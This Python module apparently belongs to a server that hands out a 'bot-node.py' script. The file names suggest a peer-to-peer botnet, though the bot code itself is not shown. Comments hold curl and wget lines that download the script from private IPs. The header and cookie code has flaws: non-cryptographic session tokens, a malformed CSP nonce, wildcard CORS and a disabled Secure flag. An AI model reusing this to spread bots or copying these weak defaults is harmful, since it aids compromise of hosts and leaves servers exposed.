import random
import uuid
import re
import base64
import time

#
#
#
def set_http_headers() -> list:
    nonce = generate_nonce_timestamp()

    csp = "script-src 'self';" \
          f"style-src 'self' nonce {nonce};" \
          "frame-src 'self';" \
          "img-src 'self';" \
          "font-src 'self';" \
          "media-src 'self';" \
          "object-src 'self';" \
          "connect-src 'self';" \
          "default-src 'self'"

    hsts = "max-age=31536000; includeSubDomains"

    return [
        "Server: Custom",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Methods: GET, POST",
        "Content-type: text/html",
        "X-Frame-Options: deny",
        "X-Content-Type-Options: nosniff",
        "X-Permitted-Cross-Domain-Policies: none",
        "Cross-Origin-Embedder-Policy: require-corp",
        "Cross-Origin-Opener-Policy: same-origin",
        "Cross-Origin-Resource-Policy: same-site",
        "Connection: close",
        "Cache-Control: no-store",
        "Referrer-Policy: no-referrer",
        f"Content-Security-Policy: {csp}",
        f"Strict-Transport-Security: {hsts}",
    ]


#
#
#
def generate_nonce(length: int) -> str:
    return ''.join([str(random.randint(0, 9)) for i in range(length)])

#
#
#
def generate_timestamp() -> str:
    """Get seconds since epoch (UTC)."""
    return str(int(time.time()))

#
#
#
def generate_nonce_timestamp() -> str:
    """Generate pseudo-random number and seconds since epoch (UTC)."""
    nonce = uuid.uuid1()
    oauth_timestamp, oauth_nonce = str(nonce.time), nonce.hex
    return oauth_nonce+oauth_timestamp

#
#
#
def set_cookies(http_header: str) -> str:
    
    cookie_expiry = "Thu, 2 Oct 2025 00:00:00 GMT"
    nonce_len = 32
    rand_id = generate_nonce(nonce_len)
    b64_csp_token = base64.b64encode(generate_nonce(nonce_len).encode())

    # "Secure; " \
    sessid = f"Set-Cookie: sessid={rand_id}; " \
                "SameSite=Lax; " \
                "HttpOnly; " \
                f"Expires={cookie_expiry};" \
                if re.search("Cookie:\s{1}sessid", http_header) == None \
                else ""
    # "Secure; " \
    csp = f"Set-Cookie: csp_token={b64_csp_token}; " \
            "SameSite=Lax; " \
            "HttpOnly; " \
            f"Expires={cookie_expiry};" \
            if re.search("Cookie:\s{1}csp_token", http_header) == None \
            else ""

    return sessid + csp

#
#
#
def get_blacklist() -> list:
    return [
        'favicon.ico',
        'test-AAAAA'
    ]

#
#
#
def response_code(code: int) -> dict:
    return [
        (key, c[0]) for key,c in {
            100: ('Continue', 'Request received, please continue'),
            101: ('Switching Protocols','Switching to new protocol; obey Upgrade header'),
            200: ('OK', 'Request fulfilled, document follows'),
            201: ('Created', 'Document created, URL follows'),
            202: ('Accepted','Request accepted, processing continues off-line'),
            203: ('Non-Authoritative Information', 'Request fulfilled from cache'),
            204: ('No Content', 'Request fulfilled, nothing follows'),
            205: ('Reset Content', 'Clear input form for further input.'),
            206: ('Partial Content', 'Partial content follows.'),
            300: ('Multiple Choices','Object has several resources -- see URI list'),
            301: ('Moved Permanently', 'Object moved permanently -- see URI list'),
            302: ('Found', 'Object moved temporarily -- see URI list'),
            303: ('See Other', 'Object moved -- see Method and URL list'),
            304: ('Not Modified','Document has not changed since given time'),
            305: ('Use Proxy','You must use proxy specified in Location to access this ''resource.'),
            307: ('Temporary Redirect','Object moved temporarily -- see URI list'),
            400: ('Bad Request','Bad request syntax or unsupported method'),
            401: ('Unauthorized','No permission -- see authorization schemes'),
            402: ('Payment Required','No payment -- see charging schemes'),
            403: ('Forbidden','Request forbidden -- authorization will not help'),
            404: ('Not Found', 'Nothing matches the given URI'),
            405: ('Method Not Allowed','Specified method is invalid for this server.'),
            406: ('Not Acceptable', 'URI not available in preferred format.'),
            407: ('Proxy Authentication Required', 'You must authenticate with ''this proxy before proceeding.'),
            408: ('Request Timeout', 'Request timed out; try again later.'),
            409: ('Conflict', 'Request conflict.'),
            410: ('Gone','URI no longer exists and has been permanently removed.'),
            411: ('Length Required', 'Client must specify Content-Length.'),
            412: ('Precondition Failed', 'Precondition in headers is false.'),
            413: ('Request Entity Too Large', 'Entity is too large.'),
            414: ('Request-URI Too Long', 'URI is too long.'),
            415: ('Unsupported Media Type', 'Entity body in unsupported format.'),
            416: ('Requested Range Not Satisfiable','Cannot satisfy request range.'),
            417: ('Expectation Failed','Expect condition could not be satisfied.'),
            500: ('Internal Server Error', 'Server got itself in trouble'),
            501: ('Not Implemented','Server does not support this operation'),
            502: ('Bad Gateway', 'Invalid responses from another server/proxy.'),
            503: ('Service Unavailable','The server cannot process the request due to a high load'),
            504: ('Gateway Timeout','The gateway server did not receive a timely response'),
            505: ('HTTP Version Not Supported', 'Cannot fulfill request.'),
        }.items() if key == code
    ][0]

#
#
# curl -vvv -o node-out-curl.py http://192.168.1.61:55333
# curl -vvv -o node-out-curl.py http://172.19.0.3:31515
#
# wget -O node-out-wget.py http://192.168.1.61:55333
# wget -O node-out-wget.py http://172.19.0.3:31515
#
def craft_http_response(tcp_packet_data: str) -> None:
    
    http_version = "HTTP/1.1"

    try:
        http_response_code  = response_code(200)
        cookies = set_cookies(tcp_packet_data)
        headers_arr = set_http_headers()
        headers_str = "\r\n".join(str(header) for header in headers_arr)
        payload = ""

        #with open("/p2p/assets/bot-node.py", "r") as f:
        with open("assets/bot-node.py", "r") as f:
            payload = f.read()

        return  f"{http_version} {http_response_code[0]} {http_response_code[1]}\r\n" \
                f"{headers_str}\r\n" \
                +(f"{cookies}\r\n\r\n" if cookies != "" else "\r\n")+ \
                f"{payload}\r\n"
    except Exception as e:
        print(f"[!] SERVER ERROR: {e.args[::-1]}")
        http_response_code  = response_code(500)

        payload = 500
        http_payload = "<!DOCTYPE html>" \
                        "<html>" \
                            f"<body>{payload}</body>" \
                        "</html>"

        return  f"{http_version} {http_response_code[0]} {http_response_code[1]}\r\n" \
                f"{headers_str}\r\n" \
                +(f"{cookies}\r\n\r\n" if cookies != "" else "\r\n")+ \
                f"{http_payload}\r\n"